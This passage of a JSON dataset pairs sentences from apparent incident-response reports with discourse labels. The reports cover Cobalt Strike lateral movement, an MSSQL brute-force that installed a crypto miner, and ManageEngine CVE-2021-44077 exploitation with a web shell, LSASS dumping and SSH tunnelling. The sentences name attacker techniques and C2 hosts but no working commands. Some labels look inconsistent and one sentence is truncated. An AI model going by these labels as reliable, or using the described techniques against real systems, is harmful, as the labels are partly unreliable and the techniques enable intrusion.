        "S1": "The threat actors also transferred ProcDump from the beachhead to multiple workstations:",
        "S2": "Threat actors performed the first lateral movement from the beachhead to the server using RDP with an Administrator account:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Threat actors used the built-in Cobalt Strike jump psexec command to move laterally.",
        "S2": "This process was beaconing to (108.62.12[.]174/dofixifa[.]co), the second Cobalt Strike C2, used during the last day of this intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "Below is an example of the service edc603a that was created on a Domain Controller:",
        "S2": "The service runs a rundll32.exe process without any arguments.",
        "relation": "MISC"
    },
    {
        "S1": "The account used to perform this lateral movement was one of the kerberoasted service accounts.",
        "S2": "This process was beaconing to (108.62.12[.]174/dofixifa[.]co), the second Cobalt Strike C2, used during the last day of this intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "This process was beaconing to (108.62.12[.]174/dofixifa[.]co), the second Cobalt Strike C2, used during the last day of this intrusion.",
        "S2": "Cobalt Strike (CS) was extensively used during this intrusion, the threat actors used CS as the main Command and Control tool, dropped several payloads, and injected into multiple processes on different hosts.",
        "relation": "MISC"
    },
    {
        "S1": "This process was beaconing to (108.62.12[.]174/dofixifa[.]co), the second Cobalt Strike C2, used during the last day of this intrusion.",
        "S2": "The graph below shows beaconing activity over time, we can notice the continuous usage of the first C2 server (45.153.243[.]142/fuvataren[.]com) from day 1 and the second C2 server (108.62.12[.]174/dofixifa[.]co) during the last day of intrusion only (day 11):",
        "relation": "ELABORATION"
    },
    {
        "S1": "Cobalt Strike (CS) was extensively used during this intrusion, the threat actors used CS as the main Command and Control tool, dropped several payloads, and injected into multiple processes on different hosts.",
        "S2": "The threat actors used default CS configuration and default named pipes.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Two CS C2 servers were used during this intrusion.",
        "S2": "The threat actors used default CS configuration and default named pipes.",
        "relation": "MISC"
    },
    {
        "S1": "Two CS C2 servers were used during this intrusion.",
        "S2": "Below is the full list of all default named pipes spotted during this intrusion:",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors used default CS configuration and default named pipes.",
        "S2": "However, the observed TTPs show common cybercrime threat actors tradecraft which may have lead to domain wide ransomware had the threat actors had enough time.",
        "relation": "MISC"
    },
    {
        "S1": "Below is the full list of all default named pipes spotted during this intrusion:",
        "S2": "AnyDesk logs, %ProgramData%\\AnyDesk\\ad_svc.trace and %AppData%\\AnyDesk\\ad.trace , show that it was used during Day 1 and Day 7 of this intrusion, using the local Administrator account each time.",
        "relation": "MISC"
    },
    {
        "S1": "AnyDesk logs, %ProgramData%\\AnyDesk\\ad_svc.trace and %AppData%\\AnyDesk\\ad.trace , show that it was used during Day 1 and Day 7 of this intrusion, using the local Administrator account each time.",
        "S2": "There was no impact (exfiltration, data encryption, or destruction) during this intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "ET POLICY SSL/TLS Certificate Observed (AnyDesk Remote Desktop Software) ET USER_AGENTS AnyDesk Remote Desktop Software User-Agent",
        "S2": "AnyDesk configuration file and the network logs revealed that the id used was 159889039 and the source IP was 108.177.235.25 (LeaseWeb USA \u2013 Cloud Provider).",
        "relation": "MISC"
    },
    {
        "S1": "Over the month of March, we observed a cluster of activity targeting MSSQL servers.",
        "S2": "These brute force attempts were observed repeatedly over the month.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Over the month of March, we observed a cluster of activity targeting MSSQL servers.",
        "S2": "We believe this tool may be a variation of NetworkServiceExploit.exe, which attempts to use NetworkService for privilege escalation.",
        "relation": "MISC"
    },
    {
        "S1": "The activity started via password brute force attempts for the MSSQL SA account.",
        "S2": "Mofcomp.exe is also used to execute scripts by parsing the MOF statements and creates new classes as part of the WMI repository.",
        "relation": "NEXT"
    },
    {
        "S1": "After having the correct credentials in their possession, the attackers then spawned a command shell via xp_cmdshell.",
        "S2": "Using xp_cmdshell, the threat actors were able to execute any command against the compromised server.",
        "relation": "NEXT"
    },
    {
        "S1": "According to Microsoft documentation, xp_cmdshell spawns a Windows command shell and passes in a string for execution.",
        "S2": "As per Microsoft\u2019s official documentation:",
        "relation": "MISC"
    },
    {
        "S1": "According to Microsoft documentation, xp_cmdshell spawns a Windows command shell and passes in a string for execution.",
        "S2": "During the intrusions, we could see SQL Server event ID 18456 Failure Audit Events in the Windows application logs.",
        "relation": "MISC"
    },
    {
        "S1": "Using xp_cmdshell, the threat actors were able to execute any command against the compromised server.",
        "S2": "Once the threat actors had established persistence on the compromised host, they moved to their final objective, which was to install and run the XMRig miner.",
        "relation": "NEXT"
    },
    {
        "S1": "After they finished writing to that file, they ran certutil to decode the base64 data into an executable file.",
        "S2": "They then executed the batch script.",
        "relation": "NEXT"
    },
    {
        "S1": "They then executed the batch script.",
        "S2": "Once the threat actors had established persistence on the compromised host, they moved to their final objective, which was to install and run the XMRig miner.",
        "relation": "NEXT"
    },
    {
        "S1": "Once the threat actors had established persistence on the compromised host, they moved to their final objective, which was to install and run the XMRig miner.",
        "S2": "The threat actors also favored the execution of batch scripts on the compromised host.",
        "relation": "MISC"
    },
    {
        "S1": "They dropped a Binary Managed Object Format (BMOF) file along with the miner itself, to do that.",
        "S2": "The event consumer of the newly created classes included a VBE script responsible for setting up and executing the XMRig miner with the correct settings.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors used mofcomp.exe to decompile the BMOF binary and register a malicious class in the WMI repository.",
        "S2": "No other activity beyond the mining was observed before the threat actors were evicted.",
        "relation": "MISC"
    },
    {
        "S1": "The initial access took place via a brute-force attack, where the threat actors mainly targeted the System Admin (SA) account.",
        "S2": "We witnessed more than 24,000 attempts from the same source before the threat actors successfully guessed the username and password for the open SQL database.",
        "relation": "NEXT"
    },
    {
        "S1": "During the intrusions, we could see SQL Server event ID 18456 Failure Audit Events in the Windows application logs.",
        "S2": "This process allows you to issue operating system commands directly to the Windows command shell using T-SQL code.",
        "relation": "MISC"
    },
    {
        "S1": "During the intrusions, we could see SQL Server event ID 18456 Failure Audit Events in the Windows application logs.",
        "S2": "If we look into the Windows Application logs, specifically, the SQL Server event ID 15457, captures this as an \u2018xp_cmdshell\u2019 event.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We witnessed more than 24,000 attempts from the same source before the threat actors successfully guessed the username and password for the open SQL database.",
        "S2": "It it likely that multiple successful logins were observed due to the automated access script that the threat actor was using.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In the next attack stage, the threat actors established a cmd shell via Extended SQL Stored Procedure (xp_cmdshell).",
        "S2": "The first commands executed by the threat actors included using taskkill for various anti-virus software.",
        "relation": "MISC"
    },
    {
        "S1": "In the next attack stage, the threat actors established a cmd shell via Extended SQL Stored Procedure (xp_cmdshell).",
        "S2": "They used xp_cmdshell to write a batch script (1.bat) to disk by redirecting strings to the file using echo commands.",
        "relation": "NEXT"
    },
    {
        "S1": "This process allows you to issue operating system commands directly to the Windows command shell using T-SQL code.",
        "S2": "MOF files are compiled using the Windows compiler tool mofcomp.",
        "relation": "MISC"
    },
    {
        "S1": "They used xp_cmdshell to write a batch script (1.bat) to disk by redirecting strings to the file using echo commands.",
        "S2": "This executable was then used in executing the 1.bat batch file.",
        "relation": "NEXT"
    },
    {
        "S1": "They used xp_cmdshell to write a batch script (1.bat) to disk by redirecting strings to the file using echo commands.",
        "S2": "Additionally, we noticed the attackers dropping a file named \u201cxitmf\u201d.",
        "relation": "NEXT"
    },
    {
        "S1": "Additionally, we noticed the attackers dropping a file named \u201cxitmf\u201d.",
        "S2": "As explained in the execution tactic above, the threat actors installed a malicious WMI event subscription by including a VBScript that would execute on the compromised host.",
        "relation": "MISC"
    },
    {
        "S1": "Looking into the file\u2019s content, we noticed that the header began with \u201cFOMB\u201d.",
        "S2": "Something to note here, regarding the kit.bat script, is that we discovered that its contents were the topic of discussion in a Chinese forum back in 2018.",
        "relation": "MISC"
    },
    {
        "S1": "BMOF is a compiled version of a Managed Object Format (MOF) file.",
        "S2": "Using the same mofcomp utility, its possible to decompile the BMOF to extract the script, using this command provided by Matt Graeber:",
        "relation": "ELABORATION"
    },
    {
        "S1": "\u201cManaged Object Format (MOF) is the language used to describe Common Information Model (CIM) classes.\u201d",
        "S2": "Mofcomp.exe is also used to execute scripts by parsing the MOF statements and creates new classes as part of the WMI repository.",
        "relation": "MISC"
    },
    {
        "S1": "Mofcomp.exe is also used to execute scripts by parsing the MOF statements and creates new classes as part of the WMI repository.",
        "S2": "Command interactions are done via WMI, for process discovery:",
        "relation": "NEXT"
    },
    {
        "S1": "Threat actors also transferred a Visual Basic Encoded (VBE) file that is executed on the host using cscript.exe.",
        "S2": "The script has several functions, one to control the coin miner software on the host, and two, to configure the parameters such as user-agent strings through randomization:",
        "relation": "NEXT"
    },
    {
        "S1": "Once run, the script would set up and execute the XMRig CoinMiner.",
        "S2": "We recognize that this is a VBE file from the file signature (\u201cmagic bytes\u201d) at the first four bytes of the top of the file.",
        "relation": "MISC"
    },
    {
        "S1": "During the execution, the password 579562847 is provided as an argument.",
        "S2": "This was used in this intrusion to run the batch file with the following command:",
        "relation": "MISC"
    },
    {
        "S1": "The script has several functions, one to control the coin miner software on the host, and two, to configure the parameters such as user-agent strings through randomization:",
        "S2": "The threat actors wrote a batch script (1.bat) that contained commands for establishing persistence on the compromised host.",
        "relation": "MISC"
    },
    {
        "S1": "The script has several functions, one to control the coin miner software on the host, and two, to configure the parameters such as user-agent strings through randomization:",
        "S2": "In the code, we observed further attempts to obfuscate sensitive attributable values:",
        "relation": "MISC"
    },
    {
        "S1": "In the code, we observed further attempts to obfuscate sensitive attributable values:",
        "S2": "We also observed another dropper.",
        "relation": "MISC"
    },
    {
        "S1": "In the code, we observed further attempts to obfuscate sensitive attributable values:",
        "S2": "The kit.bat script included instructions for executing the miner as well as for creating persistence via a schedule task.",
        "relation": "MISC"
    },
    {
        "S1": "We also observed another dropper.",
        "S2": "The kit.bat script included instructions for executing the miner as well as for creating persistence via a schedule task.",
        "relation": "MISC"
    },
    {
        "S1": "Ex.exe is an Unrar application that they used to extract more malicious artifacts:",
        "S2": "The threat actors wrote a batch script (1.bat) that contained commands for establishing persistence on the compromised host.",
        "relation": "MISC"
    },
    {
        "S1": "Something to note here, regarding the kit.bat script, is that we discovered that its contents were the topic of discussion in a Chinese forum back in 2018.",
        "S2": "The kit.bat script contained a scheduled task that would run the kit.bat script on an hourly basis.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Something to note here, regarding the kit.bat script, is that we discovered that its contents were the topic of discussion in a Chinese forum back in 2018.",
        "S2": "We used the below python code to emulate the VBScript and download the next stage payload:",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors wrote a batch script (1.bat) that contained commands for establishing persistence on the compromised host.",
        "S2": "They also made remote RDP connections possible by changing the fDenyTSConnections and UserAuthentication values to 0.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors wrote a batch script (1.bat) that contained commands for establishing persistence on the compromised host.",
        "S2": "As explained in the execution tactic above, the threat actors installed a malicious WMI event subscription by including a VBScript that would execute on the compromised host.",
        "relation": "MISC"
    },
    {
        "S1": "We later see the threat actors writing another batch file to disk and executing it.",
        "S2": "In this case, threat actors modified the below registry key to launch the miner executable (smss.exe) instead of the svchost.exe binary.",
        "relation": "MISC"
    },
    {
        "S1": "As explained in the execution tactic above, the threat actors installed a malicious WMI event subscription by including a VBScript that would execute on the compromised host.",
        "S2": "Decompiled .mof file containing the WMI event subscription.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As explained in the execution tactic above, the threat actors installed a malicious WMI event subscription by including a VBScript that would execute on the compromised host.",
        "S2": "The threat actors attempted to kill antivirus tasks that could be running on the host.",
        "relation": "MISC"
    },
    {
        "S1": "As explained in the execution tactic above, the threat actors installed a malicious WMI event subscription by including a VBScript that would execute on the compromised host.",
        "S2": "The VBScript would execute every day at 23:00 of the host local time.",
        "relation": "MISC"
    },
    {
        "S1": "This was used as a method of persistence.",
        "S2": "Decompiled .mof file containing the WMI event subscription.",
        "relation": "MISC"
    },
    {
        "S1": "The VBScript would execute every day at 23:00 of the host local time.",
        "S2": "Looking into the VBScript, we notice that it is reaching out to the domain mymst007[.]info on port 4000 to download one more file and save it as temp file.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The final method of persistence we observed was the addition of an entry into the Image File Execution Option (IFEO) registry key.",
        "S2": "The threat actors dropped a file named bigfile.txt which they used certutil to convert to bigfile.exe which we believe is a variation of NetworkServiceExploit.exe as seen below.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors dropped a file named bigfile.txt which they used certutil to convert to bigfile.exe which we believe is a variation of NetworkServiceExploit.exe as seen below.",
        "S2": "The threat actors attempted to kill antivirus tasks that could be running on the host.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors dropped a file named bigfile.txt which they used certutil to convert to bigfile.exe which we believe is a variation of NetworkServiceExploit.exe as seen below.",
        "S2": "We observed that the domain mymst007[.]info is used to download further payloads.",
        "relation": "MISC"
    },
    {
        "S1": "This was used in this intrusion to run the batch file with the following command:",
        "S2": "No other credential access was observed during this intrusion, although the threat actors did enable WDigest to make later credential access easier.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors attempted to kill antivirus tasks that could be running on the host.",
        "S2": "The privilege escalation tool the threat actors brought with them was written as a text file and then decoded using certutil into a binary file.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors attempted to kill antivirus tasks that could be running on the host.",
        "S2": "The impact was concentrated on this one host.",
        "relation": "MISC"
    },
    {
        "S1": "Through the execution of the initial batch script, 1.bat, they also disabled the User Access Control(UAC) remote restriction by setting the registry key value to \u201c1\u201d.",
        "S2": "After many files were added to the system the threat actors included commands to remove them once their execution was finished.",
        "relation": "NEXT"
    },
    {
        "S1": "Threat actors also enabled Wdigest.",
        "S2": "No other credential access was observed during this intrusion, although the threat actors did enable WDigest to make later credential access easier.",
        "relation": "MISC"
    },
    {
        "S1": "After many files were added to the system the threat actors included commands to remove them once their execution was finished.",
        "S2": "No other credential access was observed during this intrusion, although the threat actors did enable WDigest to make later credential access easier.",
        "relation": "MISC"
    },
    {
        "S1": "We observed that the domain mymst007[.]info is used to download further payloads.",
        "S2": "We have seen similar reports that make mention of the same infrastructure.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The domain was created five years ago.",
        "S2": "Attacks associated with this domain include the same or similar tactics techniques and procedures (TTPs).",
        "relation": "ELABORATION"
    },
    {
        "S1": "We have seen similar reports that make mention of the same infrastructure.",
        "S2": "We did not see any further activity in this case.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The impact was concentrated on this one host.",
        "S2": "The compromised host had XMRig miner installed and running.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The intrusion began with the exploitation of an internet-facing instance of ManageEngine SupportCenter Plus via the CVE-2021-44077 vulnerability.",
        "S2": "Confidential files were exfiltrated from the network throughout this intrusion using a mixture of web shell access and hands-on keyboard access via RDP.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor successfully exploited the RCE vulnerability in SupportCenter Plus, which allowed them to drop a web shell in an internet accessible directory.",
        "S2": "The threat actor then performed some generic enumeration of the system and enabled WDigest authentication on the server using the web shell.",
        "relation": "NEXT"
    },
    {
        "S1": "The exploit we witnessed looks very similar to a publicly available POC exploit on GitHub.",
        "S2": "All command and control traffic we observed was through the SSH tunnel to 23.81.246.84.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor then performed some generic enumeration of the system and enabled WDigest authentication on the server using the web shell.",
        "S2": "Periodically over several days, the threat actor returned and checked what users were logged into the beachhead server using the webshell.",
        "relation": "NEXT"
    },
    {
        "S1": "Enumeration on the system included querying network configuration, a list of domain joined computers, user and OS information, and current user sessions on the beachhead.",
        "S2": "Finally, on the seventh day, the threat actors performed an LSASS dump on the system, which captured the credentials of an administrative user that had recently logged into the system.",
        "relation": "NEXT"
    },
    {
        "S1": "Periodically over several days, the threat actor returned and checked what users were logged into the beachhead server using the webshell.",
        "S2": "In this case, the threat actor had access to the user\u2019s plaintext credentials as a result of WDigest authentication being previously enabled.",
        "relation": "MISC"
    },
    {
        "S1": "Periodically over several days, the threat actor returned and checked what users were logged into the beachhead server using the webshell.",
        "S2": "The following day the threat actor downloaded ekern.exe, which was a renamed version of Plink, and deployed a script to establish a reverse SSH connection to the RDP port of the beachhead server.",
        "relation": "NEXT"
    },
    {
        "S1": "Finally, on the seventh day, the threat actors performed an LSASS dump on the system, which captured the credentials of an administrative user that had recently logged into the system.",
        "S2": "An interactive RDP session was successfully established to the beachhead server by the threat actor where they began enumerating other computers on the network.",
        "relation": "MISC"
    },
    {
        "S1": "An interactive RDP session was successfully established to the beachhead server by the threat actor where they began enumerating other computers on the network.",
        "S2": "Confidential files were exfiltrated from the network throughout this intrusion using a mixture of web shell access and hands-on keyboard access via RDP.",
        "relation": "NEXT"
    },
    {
        "S1": "An interactive RDP session was successfully established to the beachhead server by the threat actor where they began enumerating other computers on the network.",
        "S2": "The documents were selectively chosen as if the attackers were looking for specific material.",
        "relation": "NEXT"
    },
    {
        "S1": "An interactive RDP session was successfully established to the beachhead server by the threat actor where they began enumerating other computers on the network.",
        "S2": "The running path of Support Center Plus at the time this command runs is C:\\Program Files\\ManageEngine\\SupportCenterPlus\\bin\\ which means the msiexec.exe uploaded by the threat actor will be favored rather than the legitimate Microsoft utility.",
        "relation": "MISC"
    },
    {
        "S1": "From the beachhead, lateral movement was conducted to three other servers via RDP, including a domain controller, a file server, and another server.",
        "S2": "This registry value was not present on the system, which informed the attacker that WDigest was disabled on the beachhead.",
        "relation": "MISC"
    },
    {
        "S1": "Confidential files were exfiltrated from the network throughout this intrusion using a mixture of web shell access and hands-on keyboard access via RDP.",
        "S2": "The threat actors were evicted from the network soon after stealing confidential information.",
        "relation": "NEXT"
    },
    {
        "S1": "Confidential files were exfiltrated from the network throughout this intrusion using a mixture of web shell access and hands-on keyboard access via RDP.",
        "S2": "The web shell dropped to the beachhead during the exploitation process was the only form of persistence observed during the intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "The documents were selectively chosen as if the attackers were looking for specific material.",
        "S2": "The threat actors were evicted from the network soon after stealing this information.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors were evicted from the network soon after stealing this information.",
        "S2": "This location is web accessible which means the threat actors can interact with the web shell through a web browser from the internet.",
        "relation": "MISC"
    },
    {
        "S1": "Initial access began with the exploitation of ManageEngine SupportCenter Plus via CVE-2021-44077, an unauthenticated remote code execution vulnerability.",
        "S2": "Support Center Plus will do this by invoking the installation via msiexec.exe by running:",
        "relation": "MISC"
    },
    {
        "S1": "Initial access began with the exploitation of ManageEngine SupportCenter Plus via CVE-2021-44077, an unauthenticated remote code execution vulnerability.",
        "S2": "The following diagram visually illustrates the CVE-2021-44077 exploitation and execution process.",
        "relation": "ELABORATION"
    },
    {
        "S1": "There are two main HTTP requests responsible for this exploit.",
        "S2": "Each step of the exploit was observed originating from a different TOR exit node.",
        "relation": "MISC"
    },
    {
        "S1": "The second request, attempted to install Zoho\u2019s Site24x7 performance monitoring tool but indirectly invoked the uploaded msiexec.exe file.",
        "S2": "The second stage of the CVE-2021-44077 exploit involved initiating the installation of Zoho\u2019s Site24x7 performance monitoring tool.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The second request, attempted to install Zoho\u2019s Site24x7 performance monitoring tool but indirectly invoked the uploaded msiexec.exe file.",
        "S2": "After the execution of that file seemed to fail, the threat actors uploaded the msiexec.exe file from above which created the web shell seconds later.",
        "relation": "MISC"
    },
    {
        "S1": "The second stage of the CVE-2021-44077 exploit involved initiating the installation of Zoho\u2019s Site24x7 performance monitoring tool.",
        "S2": "The parameters passed to msiexec.exe are never used and the Site24x7 performance monitoring tool is never installed.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The running path of Support Center Plus at the time this command runs is C:\\Program Files\\ManageEngine\\SupportCenterPlus\\bin\\ which means the msiexec.exe uploaded by the threat actor will be favored rather than the legitimate Microsoft utility.",
        "S2": "Plink was used in conjunction with a batch script named FXS.bat to establish an SSH connection with the threat actor\u2019s server.",
        "relation": "MISC"
    },
    {
        "S1": "This location is web accessible which means the threat actors can interact with the web shell through a web browser from the internet.",
        "S2": "The threat actors had previously uploaded a different file, named the same thing minutes before the web shell was created.",
        "relation": "MISC"
    },
    {
        "S1": "Here are a few commands run through the web shell.",
        "S2": "The threat actors had previously uploaded a different file, named the same thing minutes before the web shell was created.",
        "relation": "MISC"
    },
    {
        "S1": "After the execution of that file seemed to fail, the threat actors uploaded the msiexec.exe file from above which created the web shell seconds later.",
        "S2": "We can see from the Catalina.txt log that when the threat actors run certain commands such as fxs.bat (RDP tunneling) the application thinks the process is hung (runs for 30+ seconds) and creates a warning message:",
        "relation": "MISC"
    },
    {
        "S1": "After the execution of that file seemed to fail, the threat actors uploaded the msiexec.exe file from above which created the web shell seconds later.",
        "S2": "Here is some information on the first attempted msiexec file which failed.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We can see from the Catalina.txt log that when the threat actors run certain commands such as fxs.bat (RDP tunneling) the application thinks the process is hung (runs for 30+ seconds) and creates a warning message:",
        "S2": "Later during the intrusion they dumped credentials for a user that had privilege\u2019s allowing lateral movement throughout the environment.",
        "relation": "NEXT"
    },
    {
        "S1": "The web shell dropped to the beachhead during the exploitation process was the only form of persistence observed during the intrusion.",
        "S2": "Later during the intrusion they dumped credentials for a user that had privilege\u2019s allowing lateral movement throughout the environment.",
        "relation": "NEXT"
    },
    {
        "S1": "Later during the intrusion they dumped credentials for a user that had privilege\u2019s allowing lateral movement throughout the environment.",
        "S2": "The threat actors were evicted from the network soon after stealing confidential information.",
        "relation": "NEXT"
    },
    {
        "S1": "Later during the intrusion they dumped credentials for a user that had privilege\u2019s allowing lateral movement throughout the environment.",
        "S2": "During a later stage of the intrusion, an attacker dumped the LSASS process (see Credential Access section).",
        "relation": "ELABORATION"
    },
    {
        "S1": "More on the dumping method in the Credential Access section.",
        "S2": "During a later stage of the intrusion, an attacker dumped the LSASS process (see Credential Access section).",
        "relation": "ELABORATION"
    },
    {
        "S1": "Once the credentials were harvested from the LSASS dump, the threat actor returned to the environment and downloaded the binary named ekern.exe to tunnel RDP connections over SSH.",
        "S2": "On the beachhead system, the threat actor queried the registry checking to see if WDigest was enabled:",
        "relation": "MISC"
    },
    {
        "S1": "Once the credentials were harvested from the LSASS dump, the threat actor returned to the environment and downloaded the binary named ekern.exe to tunnel RDP connections over SSH.",
        "S2": "The LSASS dump was then exfiltrated out of the environment for offline analysis and rest of the actions were conducted from the account whose password was extracted from the LSASS dump.",
        "relation": "NEXT"
    },
    {
        "S1": "On the beachhead system, the threat actor queried the registry checking to see if WDigest was enabled:",
        "S2": "The intended purpose of WDigest credential caching is to facilitate clear text authentication with HTTP and SASL, however, this can be misused by the threat actor to retrieve the plaintext credentials of a user.",
        "relation": "ELABORATION"
    },
    {
        "S1": "On the beachhead system, the threat actor queried the registry checking to see if WDigest was enabled:",
        "S2": "This registry value was not present on the system, which informed the attacker that WDigest was disabled on the beachhead.",
        "relation": "ELABORATION"
    },
    {
        "S1": "WDigest allows for credential caching in LSASS which will result in a users plaintext password being stored in memory.",
        "S2": "During this period, a privileged user logged onto the system for maintenance work and after which, the threat actor dumped LSASS using comsvcs.dll.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The intended purpose of WDigest credential caching is to facilitate clear text authentication with HTTP and SASL, however, this can be misused by the threat actor to retrieve the plaintext credentials of a user.",
        "S2": "This registry value was not present on the system, which informed the attacker that WDigest was disabled on the beachhead.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This registry value was not present on the system, which informed the attacker that WDigest was disabled on the beachhead.",
        "S2": "During this period, a privileged user logged onto the system for maintenance work and after which, the threat actor dumped LSASS using comsvcs.dll.",
        "relation": "MISC"
    },
    {
        "S1": "This registry value was not present on the system, which informed the attacker that WDigest was disabled on the beachhead.",
        "S2": "The threat actor used the web shell to download file.exe onto the beachhead and save it as ekern.exe using a PowerShell download cradle.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor listed the running processes via the tasklist command and used the PID of LSASS from the output to pass to the credential dumping command.",
        "S2": "The threat actor used the web shell fm2.jsp to conduct their initial discovery on the host.",
        "relation": "MISC"
    },
    {
        "S1": "The LSASS dump was then exfiltrated out of the environment for offline analysis and rest of the actions were conducted from the account whose password was extracted from the LSASS dump.",
        "S2": "Plink was used in conjunction with a batch script named FXS.bat to establish an SSH connection with the threat actor\u2019s server.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor used the web shell fm2.jsp to conduct their initial discovery on the host.",
        "S2": "They also used the web shell to review directories, here\u2019s a few examples",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor used the web shell to download file.exe onto the beachhead and save it as ekern.exe using a PowerShell download cradle.",
        "S2": "That IP address was exposing an SSH server on port 443 which was what the beachhead made connections with.",
        "relation": "MISC"
    },
    {
        "S1": "Plink was used in conjunction with a batch script named FXS.bat to establish an SSH connection with the threat actor\u2019s server.",
        "S2": "To confirm when plink asks if they would like the public key added to known hosts.",
        "relation": "MISC"
    },
    {
        "S1": "Plink was used in conjunction with a batch script named FXS.bat to establish an SSH connection with the threat actor\u2019s server.",
        "S2": "The actor defined a custom target port to Plink (-P 443) instead of the default SSH port of 22.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Plink was used in conjunction with a batch script named FXS.bat to establish an SSH connection with the threat actor\u2019s server.",
        "S2": "The script FXS.bat was re",
        "relation": "ELABORATION"
    },
    {
        "S1": "Plink was used in conjunction with a batch script named FXS.bat to establish an SSH connection with the threat actor\u2019s server.",
        "S2": "This resulted in the actor being able to RDP to the beachhead server via the SSH tunnel.",
        "relation": "NEXT"
    },
    {
        "S1": "Force the use of SSH (Plink can support other protocols)",
        "S2": "The actor defined a custom target port to Plink (-P 443) instead of the default SSH port of 22.",
        "relation": "MISC"
    },
    {
        "S1": "This resulted in the actor being able to RDP to the beachhead server via the SSH tunnel.",
        "S2": "The actor then replaced the loopback address with various internal hosts.",
        "relation": "MISC"
    },
    {
        "S1": "This resulted in the actor being able to RDP to the beachhead server via the SSH tunnel.",
        "S2": "All command and control traffic we observed was through the SSH tunnel to 23.81.246.84.",
        "relation": "NEXT"
    },
    {
        "S1": "This resulted in the actor being able to RDP to the beachhead server via the SSH tunnel.",
        "S2": "The ManageEngine server acted as a proxy that forwarded the RDP traffic between the target host and the threat actor\u2019s server:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The ManageEngine server acted as a proxy that forwarded the RDP traffic between the target host and the threat actor\u2019s server:",
        "S2": "The headers of 23.81.246.84:433 reported the threat actor was using a Bitvise SSH Server:",
        "relation": "MISC"
    },
    {
        "S1": "That IP address was exposing an SSH server on port 443 which was what the beachhead made connections with.",
        "S2": "After getting a foothold on the beachhead machine, an attacker first downloaded the postgres DB backup of the ManageEngine SupportCenter Plus application using the web shell.",
        "relation": "NEXT"
    },
    {
        "S1": "Seven days after initial access, an attacker exfiltrated a certificate from the server, a Visio file, and an excel sheet for the accounts via web shell:",
        "S2": "Excel file downloaded via web shell:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Seven days after initial access, an attacker exfiltrated a certificate from the server, a Visio file, and an excel sheet for the accounts via web shell:",
        "S2": "Visio file downloaded via web shell:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The intrusion started with a user searching Bing for \u201cOlymplus Plea Agreement?\u201d.",
        "S2": "Around an hour after the initial infection, the threat actors ran LaZagne to retrieve all saved credentials from the pivoted workstation.",
        "relation": "NEXT"
    },
    {
        "S1": "Upon execution, Gootloader utilized encoded PowerShell scripts to load Cobalt Strike into memory and persist on the host using a combination of registry keys and scheduled tasks.",
        "S2": "The threat actors collected the results and pivoted to another host via a Cobalt Strike PowerShell beacon.",
        "relation": "NEXT"
    },
    {
        "S1": "Fifteen minutes after the initial execution, we observed the threat actors using the PowerShell implementation of SharpHound (BloodHound) to discover attack paths in the Active Directory-based network.",
        "S2": "Our evidence shows that the attackers then began looking for interesting documents on file shares.",
        "relation": "NEXT"
    },
    {
        "S1": "Fifteen minutes after the initial execution, we observed the threat actors using the PowerShell implementation of SharpHound (BloodHound) to discover attack paths in the Active Directory-based network.",
        "S2": "On the last day, and before they left the network, threat actors used Advanced IP Scanner to scan the whole network for the below open ports:",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors collected the results and pivoted to another host via a Cobalt Strike PowerShell beacon.",
        "S2": "Around an hour after the initial infection, the threat actors ran LaZagne to retrieve all saved credentials from the pivoted workstation.",
        "relation": "NEXT"
    },
    {
        "S1": "After pivoting, they disabled Windows Defender, before executing a second Cobalt Strike payload for a different command and control server.",
        "S2": "They then targeted several other workstations with Cobalt Strike beacon executables; however, no further activity was observed on those endpoints other than the initial lateral movement.",
        "relation": "NEXT"
    },
    {
        "S1": "Around an hour after the initial infection, the threat actors ran LaZagne to retrieve all saved credentials from the pivoted workstation.",
        "S2": "The threat actors then used Lazagne again on the domain controller to extract more credentials.",
        "relation": "NEXT"
    },
    {
        "S1": "Around an hour after the initial infection, the threat actors ran LaZagne to retrieve all saved credentials from the pivoted workstation.",
        "S2": "The threat actors favored RDP and remote WMI as their preferred methods to interact with the hosts and servers of interest throughout the rest of the intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "With those credentials, the threat actors used RDP from the beachhead host to the already compromised workstation host.",
        "S2": "The threat actors favored RDP and remote WMI as their preferred methods to interact with the hosts and servers of interest throughout the rest of the intrusion.",
        "relation": "ELABORATION"
    },
    {
        "S1": "With those credentials, the threat actors used RDP from the beachhead host to the already compromised workstation host.",
        "S2": "They also ran a WMI command on the beachhead host and one other host to check for AntiVirus.",
        "relation": "NEXT"
    },
    {
